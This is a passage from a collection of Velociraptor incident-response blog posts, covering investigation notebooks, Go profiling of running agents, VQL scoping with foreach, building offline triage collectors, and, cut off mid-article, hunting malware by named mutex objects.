I find that in practice I tend to write very simple VQL queries into the notebook. Most of the time I narrow the columns down, then add inclusion and exclusion filters to see the relevant data. Although VQL is extremely powerful, I think most people would find the simple VQL in the notepad pretty straight forward. Give it a try and see how you go!

---END OF FILE---

======
FILE: /content/blog/2020/2020-03-28-velociraptor-notebooks-d02e0bd11230/_index.md
======
---
title: Velociraptor notebooks
description: Post processing and reporting inside Velociraptor
date: '2020-03-28T00:38:44.349Z'
categories: []
keywords: []
---

![](../../img/0AgiLbUBbvfxAxu29.jpg?width=600px)

Velociraptor is a great tool for collecting endpoint state easily and efficiently. It is so efficient, that sometimes we end up with a lot of collected data and are left with the task of making sense of the data, and documenting our investigative process.

In [a previous article](../2020-03-06-velociraptor-post-processing-with-jupyter-notebook-and-pandas-8a344d05ee8c/) we have seen how post-processing of collected data can be done using [Jupyter notebooks](https://jupyter.org/). The notebook is a living document, allowing us to run analysis code interspersed among documentation which can be updates in real time, as the analyst post-processes and annotates the data.

Although one can still use Jupyter notebooks to post process Velociraptor collected data, the latest Velociraptor release (0.4.1) added a notebook feature built in. This saves the effort of connecting Jupyter via the API and running python wrappers to manipulate VQL. Velociraptor notebooks are also better integrated into the rest of Velociraptor with native support for VQL, markdown and embedded images. In this article we will explore a typical workflow of using Velociraptor notebooks to investigate a DFIR

## Velociraptor’s notebooks

In the following article we analyze the same case as in our [previous article](../2020-03-06-velociraptor-post-processing-with-jupyter-notebook-and-pandas-8a344d05ee8c/). After installing the latest [Velociraptor release](https://github.com/Velocidex/velociraptor/releases) (0.4.1) we see a new “Notebooks” menu option on the navigation sidebar.

![](../../img/13sxd7Sd06lwHjBYfhVI1Sg.png)

### What are notebooks?

Notebooks are free form, shared documents built right into the Velociraptor GUI. Multiple analysts can view and edit the same notebook simultaneously.

Typically in DFIR work, analysts do not necessarily immediately know the root cause of an intrusion. Analysis is often a long process of collecting evidence, post processing it in some way, analysing the results and collecting further evidence based on our findings.

Notebooks are a way of documenting this process while facilitating collaboration between different team members. During the investigation phase, they are a living document collecting conclusions from multiple artifacts, and coordinating team members. While after the investigation they are a document indicating what was done, and the logical process of reaching the final conclusions.

### Case study — scheduled tasks

This is a typical DFIR investigation. We suspect malware has installed malicious scheduled tasks to restart itself. We previously ran a hunt to collect all scheduled tasks and would like to examine the results (see the previous article for background).

### Creating a new notebook

We will create a notebook to document our analysis process. Selecting the Notebook menu in the sidebar and then clicking the “New Notebook” toolbar button.

![](../../img/1x9KwMzONb4xzd4zHd_Ps6A.png)

We will name our notebook *“Scheduled Tasks — Case 1232”,* and add a useful description. Clicking the *“Add Notebook”* button will create the new notebook which will now be visible in the top pane, and we can see an initial notebook created on the bottom pane.

![](../../img/1OlsCPDL8fF7gX13d1l_QzQ.png)

A notebook consists of a series of **cells**. Each cell can be of type “Markdown” or “VQL”. In our new notebook, the first cell consists of the name and description we entered earlier. Clicking on the cell shows actions that can be done with that cell.

![](../../img/15xWh4-EA-eFZcZJaC8Hjsg.png)

Let’s edit this cell and add our rationale for this investigations. Clicking the “Edit Cell” button will open an editor and allow us to write cell content in markdown (If you are not familiar with markdown, GitHub has an excellent guide [Mastering Markdown](https://guides.github.com/features/mastering-markdown/)). The cell editor can be either in Markdown mode or VQL mode as selected by the pull down on the right.

![](../../img/1oBMVtWq04ags52tUDZanew.png)

Let’s also assume that this investigation was started by an alert we received from our SIEM. We can simply take a screenshot of our SIEM alert and paste it into the cell editor to add context to our notebook. Velociraptor will automatically add the image into the notebook and substitute with the markdown to reference it.

Once we finish adding relevant background information to our notebook, we can save the cell by pressing the *“Save” *button (or pressing* CTRL-Enter*).

![](../../img/1bWK92yL-TFs5TgCVbB_tzA.png)

Velociraptor will render the markdown in the notebook and we can see our screenshot.

Next we need to post process the scheduled tasks we collected earlier in a hunt. Clicking the “Add Cell” pulldown provides a number of options — in our case, we want to add a cell from an existing hunt.

![](../../img/1iCdRbaZvXc5_lcQeMOJXHg.png)

Velociraptor will then ask us which hunt we want to use

![](../../img/1cpt_3CH1SEF_ThscuTQ0TQ.png)

Selecting the hunt and clicking OK will produce a new VQL cell, already populated with the basic query we need to run to see the results of the hunt. Note that we always use the **LIMIT** clause to prevent the GUI from processing too much data. At this stage we only want to see the first 10 rows until we can refine our query.

![](../../img/1ek3xccxhmfontfCA-Fdcyg.png)

Clicking “Save” will calculate the query and show us the columns available.

![](../../img/1fYx33fAnUlegODORnrRW0A.png)

We can now refine the columns we see by specifying them in the VQL query. In our case we only wish to see **FullPath, Command, Arguments** and **Fqdn** (The hostname of the endpoint). We know that our alert was for executing “cmd.exe” so we narrow our query to only see scheduled tasks with the **cmd.exe** command *(WHERE Command =~ “cmd.exe”)*.

![](../../img/1GxMuBrebyHtxHh0wLUmflw.png)

![](../../img/1v7Q9nmHRzfbtydgggYRBWA.png)

After more investigation we determine that the `silcollector` and
`dsregcmd` tasks are not malicious so we can exclude them.

![](../../img/196esqvqOz2HYIKteGdSK3w.png)

![](../../img/1zYsu9uCe-t9T8UkfHPbt3A.png)

We repeat the process as needed until left only with the suspicious commands.

In practice we can now add more markdown cells to explain our findings, implement remediation hunts to remove the malicious scheduled task etc. We can even include the VQL we ran in the report by using markdown code blocks.

![](../../img/1iaO11t4Zbn63dQQhkcEDrw.png)

![](../../img/1LyQdC_lK079EUYwwSDT70w.png)

### Exporting the notebook

It is great to have a notebook inside Velociraptor, but we really need to be able to print it or share it with others. Additionally, DFIR cases are typically very fluid and the notebook will evolve through multiple revisions. As new data becomes available, perhaps conclusions reached in previous versions need to be revised. This is why we say a notebook is a **living** document

For these reasons, Velociraptor allows users to export the notebook into plain HTML. The HTML export is a point-in-time export, as the investigation proceeds and new information becomes available, the same notebook may be exported again and again, each version revealing new findings.

To export our notebook we select it in the top pane then click on “Export Notebook” button in the toolbar. The dialog box shows us all the existing exports from previous times and also allows us to create a new export.

![](../../img/1-iyUl49fvYJUvwohI5SZNA.png)

Clicking on any of the exported files, opens the exported HTML file in another browser window.

![](../../img/1zyFeV0l40eujMCj3OgL4aQ.png)

![](../../img/1FfLBeDrVEDJH2B9q8gYlJw.png)

Although in this view the tables are not interactive as before, the data is all available there.

Alternatively, we might want to export the result of each post-processed table. To export one table to CSV we can simply click the “Export to CSV” button at the top left of each notebook table

![](../../img/10_ZCTqrANgf010xbAMRS0Q.png)

## Conclusions

The new Velociraptor notebook interface adds to Velociraptor’s capabilities as a one stop shop for DFIR investigations. Not only do we have the ability to quickly and efficiently collect artifacts from endpoints, we can now post-process these artifacts in the tool itself. Being able to document our investigative process and produce a report gives us great flexibility without resorting to clunky file exports and spreadsheets.

Having notebooks as a built-in feature and usable out of the box removes the need for fiddly setup with API connectivity, and supporting external programs like Jupyter or Python. Simple, powerful, works out of the box!

---END OF FILE---

======
FILE: /content/blog/2020/2020-08-16-profiling-the-beast-58913437fd16/_index.md
======
---
title: Profiling the beast
description: Velociraptors exposing their inner workings…
date: '2020-08-16T00:38:44.349Z'
tags:
- Internals
categories: []
keywords: []
---

![Photo by [Daniel Cheung](https://unsplash.com/@danielkcheung?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral)](https://cdn-images-1.medium.com/max/10582/0*VRw2NF77V7mzrtQw?width=600px)*Photo by [Daniel Cheung](https://unsplash.com/@danielkcheung?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral)*

You might have previously heard about Velociraptor — fast becoming the standard open source agent for endpoint monitoring and collection. Being an open source project provides users with visibility into the inner workings of the tool since anyone can see the source code and even contribute to it!

While I usually write about Velociraptor features that make DFIR work easier and more effective, this time I am actually going to talk about a feature of the Golang programming language itself (which Velociraptor is written in). Golang provides unprecedented visibility to the state of production binaries, and these mechanisms are available and easily accessible within Velociraptor.

This post introduces new tools available for users since the 0.4.8 release to more easily gain visibility into the inner workings of Velociraptor, and be able to share these with the developers in order to assist in finding and fixing bugs. Although the post will focus on the very technical low level details available for developers, end users can see how they can assist developers by collecting important runtime information (Or even using it to understand what the tool is actually doing).

## Endpoint Telemetry

Those who have already seen Velociraptor in action might be very familiar with the built in telemetry available within the tool. The Velociraptor endpoint agents (termed Client) collect memory and CPU utilization information about the agent process every 10 seconds and send it to the server. The client performance stats are available right in the host overview page.

![](../../img/1ojviZVbiMFj-fBS2nBVbLQ.png)

In the example above we see a typical hunt running on this specific endpoint — the CPU load spikes for a few seconds to a few minutes, then when the collection completes, the CPU load returns to normal levels (at less than 1% of one core), and a short time later memory use is also returned to the system. Of course depending on the specific hunt run, the amount of work the client has to do may be larger and take longer.

Similarly, the server also collects telemetry periodically, which you can see on the main dashboard (this data is also available using Prometheus/Graphana which are more appropriate for larger deployments). Again depending on the amount of post processing done on the server the CPU and memory footprint can vary.

![](../../img/1EchDpaQPy19KrQe9ZouF3g.png)

## Profiling

Velociraptor is written in Golang and one of the more useful (if not well advertised) feature of the Go runtime is the ability to profile the running program. Most programming languages have mechanisms to profile running code and collect information about memory allocations, backtraces etc — however in many programming languages, this information can only be collected by running a special debug build of the binary.

What makes Golang different is that **every binary** has the ability to profile itself out of the box. Obviously this capability is disabled by default (since profiling itself has a non-trivial runtime cost) but it can simply be switched on at runtime for a limited time and then switched off. This means that we do not need to restart the binary in debug mode, nor replace a running binary with a special debug build! As a developer, I can not overstate the usefulness of this!

{{% notice note %}}
If we see a Golang process running in production and want to inspect its inner working all we need to do is enable profiling for a short time (say 30 seconds) capturing execution traces **without restarting or otherwise affecting the running process!**
{{% /notice %}}

Velociraptor exposes this functionality by simply offering the **profile()** VQL function. This is then utilized by two artifacts:

1. The **Generic.Client.Profile** artifact allows collecting profile information for a running client on the endpoint.

1. The **Server.Monitor.Profile** artifact similarly allows to collect profiling information from the server.

In the following example we examine how profiling can be used to gain an understanding of what is going on under the covers.

### Example — recursive file hash

To illustrate this process I will launch a CPU heavy collection on my endpoint. I create a new artifact collection of the **Windows.Search.FileFinder** artifacts, searching recursively for all files below *C:\Users* and hashing them all.

![](../../img/1K5FlQK6zzhpg0SObQFcTcg.png)

This collection is very CPU intensive and actually takes some time to complete on the endpoint. I can tell this because the CPU footprint in the host’s VQL drilldown pane shows the collection progressing with CPU load around 100% of a core and memory use between 50 and 100mb for about 8 minutes.

![](../../img/1mxVuPJ1lWuGSHnYyObwnpw.png)

For the sake of this discussion, assume that I am not 100% sure what is going on with this collection and why it is taking so long (although I have a theory!). I can remotely acquire profiling information from the client, **while the collection is taking place!**

Simply schedule a new collection of the **Generic.Client.Profile** artifact, selecting the CPU profile checkbox (There are a number of other debugging data and traces that can be acquired at the same time but I won’t go into these here).

![](../../img/16SDwrh4quetvE_emHQnfmg.png)

When launching this collection, the profiles will be acquired concurrently (note that Velociraptor can collect multiple artifacts at the same time). So actually collecting the **Generic.Client.Profile** artifact will result in collecting information on whatever else is happening within the Velociraptor process at the same time — Collecting this artifact essentially starts recording traces for 30 seconds, then stops recording traces and sends those traces back.

![](../../img/1Ypb_iKi_s9ypRzexekYAAw.png)

By default the profile is taken over 30 seconds, after which it is uploaded to the server like any uploaded file. I can simply download the profile from the **Uploaded Files** tab by clicking the link.

![](../../img/17ZeuBYe5dIV_LATRLZkUaw.png)

After downloading the profile file, I convert it to a callgrind format, so it can be viewed by my favourite profile inspector [kcachegrind](https://kcachegrind.github.io/html/Home.html) (there are other similar viewers and the Golang one is [called pprof](https://github.com/google/pprof)).

```sh
$ go tool pprof -callgrind -output=profile.grind profile.bin
$ kcachegrind profile.grind
```

![](../../img/1GFekz4L0I4hm-LzR6EZbCQ.png)

The [kcachegrind](https://kcachegrind.github.io/html/Home.html) tool allows me to interactively inspect the relative CPU time spent on each function. In the screenshot above we can see the left pane showing the relative amount of time taken by each function. The bottom right pane shows an interactive call graph visualizing how each function spends its time. In this case we can see the *HashFunction.Call()* function is responsible for 65% of the time spent. In turn it spends about 5% of CPU time reading the file, 4% calculating the sha1, 10% the sha256 and 3.5% the md5 hashes. (The exact numbers will depend on the actual set of files present on the endpoint)

![](../../img/1VV4GJRhUlO2rnN8zG1ahKA.png)

Scrolling the call graph in this case shows that the `os.Open()`
function spends about 35% of the time. Since `os.Open()` is not a part
of our own code, it shows we end up spending most of our time in the
operating system. In fact 35% of our time is spent waiting for Windows
Defender’s real time scanner (which blocks `os.Open` for us as it
scans the files on demand — Windows defender is a huge performance
killer.).

{{% notice note %}}
Our job as Velociraptor developers is to spend as little time as possible in our own code relative to the time spent in the operating system or external libraries.
{{% /notice %}}

The function’s source code is shown in the top right pane and we see how much time is spent at each line of code. This makes it easy to see what function calls end up taking the most time and guides our thinking into possible optimizations

A performance bug arises when our function does more work than is necessary and therefore spends too long doing it. This slows down processing. Clearly in this case the biggest contributors are hashing and filesystem operations which exist outside our code base — so this VQL query is pretty good already.

NOTE: The astute reader may spot 5.8% lost to the garbage collector through calls to *makeslice()* in line 67. These calls were eliminated by a recent commit.

### Conclusions

Velociraptor is an open source project — exposing its inner working to all users. While we do not require users to be able to understand the profiling information themselves, they are able to easily collect this data on running production deployments.

By exposing debugging and profiling tools in an easy way to end users, developers enable users to attach more useful traces to bug reports, and allow developers to assist in a more efficient way than simply reporting qualitative information such as high memory use or non-performant code.

The profiling traces are typically much smaller than full memory core dumps and usually do not contain sensitive information. Profiles only contain high level statistics about memory and CPU usage (For example the CPU profile we saw in this article are obtained by statistic analysis of[ sampled backtrace](https://golang.org/pkg/net/http/pprof/)s).

We find this extremely valuable in the Velociraptor project, but the same approach can be replicated by any Golang project:

{{% notice note %}}
By exposing profiling and debugging information to our users, in running production binaries we are able to easily get high value visibility into hard to reproduce error conditions and therefore be more effective in isolating and fixing bugs.
{{% /notice %}}

If you are interested in looking inside Velociraptor’s inner workings, check out the[ Github](https://github.com/Velocidex/velociraptor) page and join us on Discord and our mailing list.

---END OF FILE---

======
FILE: /content/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/_index.md
======
---
title: The Velociraptor Query Language Pt 2
description: Scopes, Looping and joining with foreach…
tags:
- VQL
- Low level
date: '2020-06-19T00:38:44.349Z'
categories: []
keywords: []
---

![](../../img/0rLy01O0JHT3Kp57q.jpg)

In our previous article I introduced the basics of the Velociraptor Query Language (VQL). We have learned the basic structure of VQL is similar to the SQL SELECT statement

![](../../img/06-m6txTbGOzeIqrJ.png)

However, one of the main differences between SQL and VQL is that VQL’s data sources are not simple data tables, but are instead executable code termed “plugins”. VQL plugins are simply generators of rows, and may take a number of named arguments.

### The scope

Just like most other programming languages, VQL has a concept of a scope. You can think of the scope as a bag of names referring to values. When VQL encounters a symbol reference within in the query, the VQL engine will consult the scope at that point and try to resolve the symbol’s name for an actual object.

For example consider the following simple query
```vql
SELECT * FROM info()
```

When VQL encounters the symbol “**info**” it looks at the scope object used to evaluate the query, for a plugin with that name. If there is such a plugin, VQL will call it and extract rows from it.

Scopes can also be nested — a scope is not one simple dictionary, instead it is a stack of dictionaries. Looking up a name in the scope walks the scope stack in reverse order (from inner scope to outer scope) looking for a match.

![](../../img/1IXt3ZEGZDVlbk1nUGQYQVw.png)

Consider the above query SELECT OS FROM info(). The query begins with a parent scope and then VQL will run the info() plugin. The plugin will emits a row containing information about the platform. VQL will then create a nested subscope appending the row to the parent scope, and propagate the row further in the query.

The column selector in this query refers to the symbol **OS**. In order to resolve this symbol, VQL will walk the nested scope in reverse and will find a column called OS in the row. This will resolve the name and end the search, causing the OS to be emitted into the result set.

Lets crank it up a bit — what if we refer to an unknown symbol?

![](../../img/14NKhmecY8Wu2GTxDcfVn1g.png)

In the above query SELECT OS, Foo FROM info() we refer to an unknown symbol called **Foo**. VQL will attempt to resolve this symbol by walking the scope stack as before, but since the symbol is not known this will fail.

VQL emits a warning that Symbol Foo is not found and helpfully prints the current scope at the point of resolution. As you can see from the warning message, the scope consists of a list of layers, each layer has a set of columns. This is why we refer to the scope as a scope stack.

The last element in the scope stack is the row produced by the info() plugin. (As can be seen by the usual columns emitted by info() including an OS column).

Note that VQL emits a warning but the query keeps going — most errors in VQL are “soft” errors that do not terminate the query from running. VQL does its best to continue with query execution as much as possible.

### The foreach plugin and looping

The previous section covered the query scope in what seems like a rather theoretical and very computer science manner — why should you care about it? The concept of scope is central to VQL and it is critical to understanding how data moves throughout the query.

Consider the example of the foreach() plugin. Unlike SQL, VQL does not support joins. Instead, VQL provides a plugin to enable data from two different data sources to be combined.

In VQL plugins accept named arguments, but the arguments do not have to be simple types like integers or strings. It is also possible to provide a subquery as an argument to a plugin. The foreach() plugin takes advantage of this property by accepting a **row** query and a **query** query. For each row emitted by the **row** query, the foreach() plugin executes the query provided in the **query** argument. This is illustrated in the diagram below.

![](../../img/1EMA7RdO2bH0ZBoS3EPTP9A.png)

How can we use this in practice? Consider the following example…

![](../../img/1XgdBwQdDL4VHhJAWJGsFEw.png)

In this example, we select all columns from the foreach() plugin, providing the **row** argument a query which lists all the running processes and extract their binary path. For each binary path, we run the stat() plugin returning filesystem information (like timestamps, size etc).

While this query is obviously useful from a DFIR perspective (it tells us when the binary of each process was modified), it also shows how scope is used within VQL.

You might notice that we refer to a symbol Exe within the **query** query — where does this get resolved from? The foreach plugin creates a sub-scope in which to run the **query** query, and appends the row to it. In this way, it is possible to access symbols from the iterated row from the inner loop, and therefore stat a new file each time. Information flows from the **row** query into the **query** query by way of the nested scope that is shared between them.

### More foreach examples

The foreach plugin is one of the most often used plugins in VQL. It is very common to apply one plugin over the result set of another plugin. Here we give several examples:

#### Yara scan files matching a glob expression:

![](../../img/1bGb_CYsiRQko7ai0mcWaVw.png)

#### List all open file handles from all chrome processes:

![](../../img/1h8EgsM6ji2Vv1ewQLx5ikQ.png)

### Conclusions

This second installment in our series of articles about VQL internals I introduced the idea of scope in VQL. We saw how scope lookups are central to controlling data flow within the query, with some plugins creating nested sub scope in which to evaluate subqueries.

We saw how this principle is applied in the **foreach()** plugin to implement a looping control flow — apply a query over each row produced by another query. This construct allows us to iterate over rows and act on each one with a second dedicated query. Although functionally equivalent to an SQL join operation, it is arguably easier to read and understand VQL queries.

In the next part we see how VQL queries themselves may be stored in the scope and reused. We go back to the concept of lazy evaluation we encountered in the first part and see how this applies to sub queries. We then introduce event queries as a way to run fully asynchronous and event driven VQL.

If you want to know more about Velociraptor, VQL and how to use it effectively to hunt across the enterprise, consider enrolling for the next available training course at [https://www.velocidex.com/training/](https://www.velocidex.com/training/).

---END OF FILE---

======
FILE: /content/blog/2020/2020-07-14-triage-with-velociraptor-pt-4-cf0e60810d1e/_index.md
======
---
title: Triage with Velociraptor — Pt 4
description: Building a stand-alone collector with the GUI
date: '2020-07-14T00:38:44.349Z'
tags:
- Forensics
- Offline Collector
categories: []
keywords: []
---

![[Woman vector created by vectorpouch ](https://www.freepik.com/free-photos-vectors/woman)— [www.freepik.com](http://www.freepik.com)](https://cdn-images-1.medium.com/max/2560/1*M5dVyBt08NsIIsxq32V3uQ.jpeg)*[Woman vector created by vectorpouch ](https://www.freepik.com/free-photos-vectors/woman)— [www.freepik.com](http://www.freepik.com)*

Velociraptor is a great tool for collecting Artifacts such as files and other state information from endpoints. Artifacts are simply VQL queries wrapped inside a YAML file providing the query with sufficient context to operate. Typically the triage phase of the DFIR process involves collecting and preserving evidence as quickly as possible, performing quick analysis in order to identify machines of interest for further analysis.

The previous parts in this triage article series covered various scenarios where Velociraptor can help with triage. [Part 1](https://medium.com/velociraptor-ir/triage-with-velociraptor-pt-1-253f57ce96c0) explored the **Windows.KapeFiles.Targets** artifact — an artifact primarily focused on collecting and preserving files. [Part 2](https://medium.com/velociraptor-ir/triage-with-velociraptor-pt-2-d0f79066ca0e) explained how artifacts can be added to a configuration file embedded inside the binary producing an automated collector — as soon as the binary is run, it will simply collect the artifacts it was pre-programmed with. [Part 3](https://medium.com/velociraptor-ir/triage-with-velociraptor-pt-3-d6f63215f579) levels up our capabilities and shows how to automatically upload the collected files to a cloud bucket.

We have received a lot of feedback from users about the processes described in these articles and to be honest it is a bit fiddly — one needed to edit YAML config files and call a sequence of commands to make it work.

Therefore, in recent releases, Velociraptor has grown a GUI to make this process much easier and more robust. This article will introduce this GUI and discuss how you can build a custom offline collector that collects a bunch of artifacts, then uploads them into a cloud bucket.

### Installing a local server

Before we can create a new custom collector, we need to access the GUI — this means running a minimal Velociraptor server. If you already have a proper Velociraptor server deployed you could just use that. For this article I will work on windows by spinning up a local temporary server.

First I have downloaded and installed the official MSI package from the [Velociraptor releases page](https://github.com/Velocidex/velociraptor/releases). This will unpack the executable in the **C:\Program Files\Velociraptor\ ** directory.

In order to start a Velociraptor server I will create new server configuration file by running the interactive wizard using

```sh
# velociraptor.exe config generate -i
```

![](../../img/15wHG_tix0ZpeXIJuYScWKg.png)

We will be running the server on **Windows**, Using the **FileBaseDataStore** with a **Self-signed SSL** configuration. I will also add a user called “**mic**” to the server (basically I pressed enter on each question to accept the default).

Now I can start the frontend using:

```sh
# velociraptor.exe -c server.config.yaml frontend -v
```

![](../../img/1MneJxbjF5TmYUxzmCaOrWw.png)

The GUI will be listening on [https://127.0.0.1:8889/](https://127.0.0.1:8889/) by default. So let's visit it with our browser

![](../../img/1vcBHvISTTRm_B0NlBanD2Q.png)

### Building the offline collector

An offline collector is simply a binary which is pre-configured to collect certain artifacts — when the user runs it without arguments, the binary will start collecting the artifacts and then terminate.

The script that actually builds the binary is a server side VQL artifact (it is actually running VQL on the server) hence we need to launch it from the “Server Artifacts” screen on the left sidebar.

![](../../img/1yA8N8OgcVKP-kvjJwnljwQ.png)

Click the **Build Collector** button to bring up an artifact search dialog. This dialog is very similar to the one you use to collect artifacts from the endpoint in a client/server model — and for a good reason! An offline collector is simply a way to collect the artifacts that we could have collected using a client/server without having a full Velociraptor deployment. We are using sneakernet rather than internet to transfer the files, but the data we collect are exactly the same!

For this example, we will collect the KapeFiles targets as in previous articles. Simply click add to add this artifact to the collection set. You can add multiple different artifacts at the same time. Note that you are not restricted to just collect files! You can collect processes, memory or any other artifact you can think of — Velociraptor will just collect each one into the one output zip file.

### Configuring the artifacts

Velociraptor artifacts take parameters to control and customize the VQL they run. Depending on the chosen artifacts, different parameters will be available for configuration. Simply scroll down to select which Kape target file to collect As a reminder a KapeFile target (.**tkape**) file is a simple YAML file specifying a file glob pattern selecting certain files to collect.

![](../../img/1sfdds6gdFa5irpLQuCsh1A.png)

We will simply select the **BasicCollection** which includes things like the registry hives, the USN Journal etc. When we are happy with the collection, click Next.

![](../../img/1UP2MAPGNch_5ezdrWKUL9g.png)

Velociraptor will repack the Velociraptor binary with the required artifacts, so here we need to select the target operating system. Let’s leave the **Collection Type** as *Zip Archive* for now — this simply creates a large Zip file containing all the collected data. Clicking Next now begins the build process. The first time we run this after install, Velociraptor will contact Github to download all the binaries it might require so it might take a few minutes to get started.

![](../../img/1URkBb2Wl0uQZszjygM7Baw.png)

This process simply ends up calling the **Server.Utils.CreateCollector** artifact. The Artifact runs VQL query which creates the packed binary (on the server) and uploads it to the server again. We can simply click* “Prepare Download”* to obtain a zip file with the executable in it.

### Running the collector

I will now download the zip file from the server and extract the collector into the download directory for testing.

![](../../img/1djPVk9gI3TP-c-zQhd93uA.png)

![](../../img/1NOxJpFX8xRlepBT2YZD8qA.png)

Simply running the binary will begin to collect all the artifacts we specified — in this case the KapeFile Basic Collection target. Finally an output Zip file and a HTML report will be produced using the hostname and timestamp.

![](../../img/18Dv9vI8lZ8FYm1MxbUAR1w.png)

### Including external tools

Since release 0.4.6, Velociraptor has built in support for external tools. This means that artifacts that declare tools that they need will receive those binaries on the endpoint when they are being collected. We previously described[ this process](https://medium.com/velociraptor-ir/velociraptor-in-the-tool-age-d896dfe71b9?source=friends_link&sk=20178bda3d9accc46d343b1c825c75a6) using the client/server model.

When building an Offline collector, Velociraptor will also embed the external tools directly into the binary without needing to do anything different with the artifact. Note that the offline collector **does not download** the tool from an external URL — the tool is already packaged in the collector binary itself.

{{% notice tip %}}

The artifact will run the same way when used in client/server mode or
in offline collector mode. This makes it easier to use the same
reusable VQL in different contexts.
{{% /notice %}}

Let’s try to collect the same artifact we did previously — the **hollows hunter** artifact. Just to recap the artifact is shown below

<script src="https://gist.github.com/scudette/0f5d5102b6e3b1580b4feccdf7d59b53.js" charset="utf-8"></script>

I will just add it to the Offline Collector builder

![](../../img/11zNKC3hp53YU6rqlcW3bfQ.png)

Build the collector as before… extract it to the downloads directory again and launch the collector binary.

![](../../img/17xUMzXapzXS_7HFXgQQzww.png)

We can see that the **hollows_hunter64.exe** binary is copied into a temp file, executed and its results uploaded into the zip file. All temp files are cleaned up after collection.

### Collecting to the cloud.

Previously we collected files into a local Zip file. Sometimes it is more convenient to upload the collection to a cloud bucket so the user does not need to worry about transferring a large collection to us.

To do this, simply select a different Collection Type — I will choose AWS bucket or you can also upload to Google Cloud Storage. You will need to obtain an upload key for the S3 bucket. This is described in the [AWS documentation](https://docs.aws.amazon.com/general/latest/gr/aws-sec-cred-types.html#access-keys-and-secret-access-keys). You should also restrict key access to the bucket to upload only since the keys are embedded inside the collector binary (See the AWS [examples on user policies](https://docs.aws.amazon.com/AmazonS3/latest/dev/example-policies-s3.html)).

![](../../img/1hcyeu84ENyeT0z3f4i7ocA.png)

Running this, the collector will automatically upload the zip file and the report to the cloud bucket.

![](../../img/1wx7sv-gvtvSUXBHYwDLzUA.png)

### Conclusions

Velociraptor is simply a VQL evaluation engine. Although it works best in client/server mode sometimes we have to use an offline collector. The Offline collector is independent and pre-programmed to collect the most appropriate artifacts for triage and then upload the data to a safe location. You can launch the offline artifact across the network via group policy, WMI or WinRM as a kind of poor-man’s remote forensics platform.

Remember that the offline collector is not limited to simply collecting files! It has the full power of Velociraptor at its disposal so it can collect any volatile machine state that can be collected by Velociraptor — including process memory scanning and dumping, file yara scans, MFT analysis and more.

To play with this new feature yourself, take Velociraptor for a spin! It is a available on [GitHub](https://github.com/Velocidex/velociraptor) under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2020/2020-01-12_hunting-malware-using-mutants-ea08e86dfc19/_index.md
======
---
title: Hunting Malware using Mutants
description: Scaling up with Velociraptor
date: '2020-01-12T00:38:44.349Z'
categories: []
keywords: []
---

#### By Mike Cohen

![](../../img/0_VnKhzd08IqjE54X.jpg)

Recently Velociraptor has gained some interesting process analysis features. This is the first in a series of short articles discussing how you can use these new features to inspect suspicious processes on your endpoint and hopefully catch malware before it can gain a long term foothold.

This article will focus on windows Named Mutex Objects (On windows these are called Mutant Objects for some reason).

### Mutants and Malware

What is a Mutant? In the Windows world, a Mutant is a kernel object
which allows programs to synchronize events between them. Malware
often uses a named Mutant to ensure it does not re-infect the same
machine and only run a single copy of the malware.

For example, consider malware which is delivered via a malicious word
document. Each time the document is opened, the malware may
unnecessarily reinfect the machine, increasing its chance of
detection. To avoid this, the malware attempts to open a named mutex
with a predetermined hard coded name. If the
[`CreateMutex`](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexa)
call succeeds then the malware can continue to run. If the call fails
it is most likely because another copy of the malware is already
running, therefore the malware will exit.

The actual name of the mutant is randomly chosen but typically predictable. Many malware variants hard code the name (more on this below). Services such a Virus Total and malware classification and analysis systems will often record the names of the created Mutex objects in their analysis. For example consider the following hash I grabbed in random from the OSINT thread feed at [https://osint.digitalside.it/Threat-Intel/digitalside-misp-feed/5e1533e4-bb94-4c3f-82c2-2263c0a8018c.json](https://osint.digitalside.it/Threat-Intel/digitalside-misp-feed/5e1533e4-bb94-4c3f-82c2-2263c0a8018c.json) . This particular alert concerns a specific malware detected by [VirusTotal](https://www.virustotal.com/gui/file/6b78ad1d871efaf95ef0f48ac62bc00b948ea80f96ee21b4d29dbd76a0a10ee0/detection).

![](../../img/1xcKqFOcYn6PWqa-3WSc5hw.png)

It looks pretty nasty. VirusTotal also documents some interesting behavioral characteristics. Specifically we see the malware creates a bunch of Mutex objects with specific names

![](../../img/1qS7_iGW3UwaFxVKPAEgu8A.png)

We can use this information to hunt for the specific mutexes in our environment to check if the malware is installed anywhere. Even if we don’t get a hit right away, it is still useful to collect all the Mutant objects on our endpoints anyway and record them for historical purposes — we can then routinely run known bad mutant names against our historical record to detect past compromises we may not have been aware of.

### Simulating Malware that uses Mutants

Let’s emulate the behavior of a typical rootkit malware. The following simple PowerShell script simply tries to acquire a global mutant and if successful proceeds to sleeping for some time. If the script is unable to acquire the mutant, it will simply exit.

<script src="https://gist.github.com/scudette/1136b419fc15b08b971b5f94458e20f6.js"></script>

Lets test this script — the first time it is run from one terminal the mutant is acquired. If run again the script is unable to obtain the mutant and simply exits after printing a message.

![](../../img/1QjSyPyxu3v6dOwZ460howg.png)

Velociraptor has an artifact specifically designed to collect Mutants from Windows endpoints. Let’s take a closer look at the VQL behind the **Windows.Detection.Mutants** artifact

![](../../img/15-jpdsPauFv5wVBdMMiJRg.png)

The artifact actually offers two methods for collecting Named Mutex objects:

1. Collecting via the **handles()** VQL plugin will enumerate all [open handles](https://docs.microsoft.com/en-us/windows/win32/sysinfo/kernel-objects) for each process and filter out only the Mutant handles.

1. Using the Kernel Object Tree, the **winobj()** VQL plugin enumerates the [kernel’s object namespace.](https://docs.microsoft.com/en-us/windows/win32/sync/object-namespaces)

Let’s see what this artifact returns (I will filter the GUI to only show the Mutant we created to avoid confusion, since there are typically many Mutants on a real system created by legitimate software). The following figures show the bad mutant as discovered via the two supported methods

![Mutant discovered by the handles() plugin method](../../img/1v6c84PV3lD_77ICQDfuBgA.png)*Mutant discovered by the handles() plugin method*

